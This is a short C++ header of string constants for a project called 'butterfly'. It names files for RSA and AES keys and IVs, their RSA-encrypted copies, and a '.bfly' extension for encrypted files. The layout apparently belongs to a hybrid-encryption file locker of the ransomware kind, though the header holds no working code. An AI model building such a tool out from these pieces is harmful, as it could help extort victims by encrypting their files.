
#ifndef BUTTERFLY_PARAMS_H
#define BUTTERFLY_PARAMS_H

namespace butterfly
{

// Files to encrypt the CPrivateRSA.bin
const std::string ENC_CPRIVATERSA_FILENAME   = "CPrivateRSA.bin";
const std::string RSA_ENCKEY_CPKEY_FILENAME = "rsa_ek_cpkey.bin";
const std::string RSA_IV_CPKEY_FILENAME     = "rsa_iv_cpkey.bin";

const std::string RSA_ENCRYPTED_KEY_FILENAME = "RSAEncryptedKey.bin"; //delete
const std::string RSA_IV_FILENAME            = "RSAIV.bin"; // delete

// Files to encrypt the AESKey.bin
const std::string ENC_AESKEY_FILENAME        = "AESKey.bin";
const std::string RSA_ENCKEY_AESKEY_FILENAME = "rsa_ek_aeskey.bin";
const std::string RSA_IV_AESKEY_FILENAME     = "rsa_iv_aeskey.bin";

// Files to encrypt the AESIV.bin
const std::string ENC_AESIV_FILENAME         = "AESIV.bin";
const std::string RSA_ENCKEY_AESIV_FILENAME  = "rsa_ek_aesiv.bin";
const std::string RSA_IV_AESIV_FILENAME      = "rsa_iv_aesiv.bin";


const std::string ENC_BFLY_FILE_ENDING       = ".bfly";

} // namespace butterfly

#endif //BUTTERFLY_PARAMS_H
